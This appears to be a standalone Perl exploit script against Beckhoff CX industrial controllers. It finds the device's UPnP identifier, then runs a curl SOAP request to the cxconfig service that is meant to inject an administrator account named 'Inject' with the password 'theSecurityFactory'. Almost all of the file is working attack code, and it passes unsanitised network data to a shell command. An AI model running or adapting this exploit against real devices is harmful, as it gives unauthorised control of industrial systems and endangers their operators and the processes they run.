#!/usr/bin/perl
	use IO::Socket::INET;
	use strict;
	use warnings;
	if ($#ARGV < 0) { print "Usage: $0 ip\n"; exit(-1); }
	system("clear");
	print "Connecting to UPNP\n";
	my $upnp_req =	"M-SEARCH * HTTP/1.1\r\n" .
		"Host:239.255.255.250:1900\r\n" .
		"ST:upnp:rootdevice\r\n" .
		"Man:\"ssdp:discover\"\r\n" .
		"MX:3\r\n" .
		"\r\n";
	my $ip = $ARGV[0];
	my $socket = new IO::Socket::INET (	PeerAddr => "$ip:1900", 
Proto => 'udp') or die "ERROR in Socket Creation : $!\n";
	$socket->send($upnp_req);
	my $usn;
	while (1)
	{
		my $data = <$socket>;
		print "$data";
		# Get the USN
		if ($data =~ /^USN:/) { 
			print "\nUSN seen. Trying to get it\n";
			($usn) = $data =~ 
/^USN:uuid:(.*)::upnp:rootdevice/;
			last;
		}
	}
	print "\n\nUSN found: $usn\n\n";
	print "Creating curl command\n\n";
	my $curl_command = "curl -i -s -k  -X 'POST' " .
 		"   -H 'SOAPAction: 
urn:beckhoff.com:service:cxconfig:1#Write' -H 'Content-Type: text/xml; 
charset=utf-8'  " .
		" --data-binary 
\$'00-1340079872KAAAAAYAAAAAAAAAEgAAAEluamVjdHRoZVNlY3VyaXR5RmFjdG9yeQAA'  
" .
		"   'http://"  . $ip . ":5120/upnpisapi?uuid:" .  $usn . 
"+urn:beckhoff.com:serviceId:cxconfig'";
	print "Executing Curl command\n\n";
	system($curl_command);
	print "User: Inject, Password: theSecurityFactory should be 
injected";
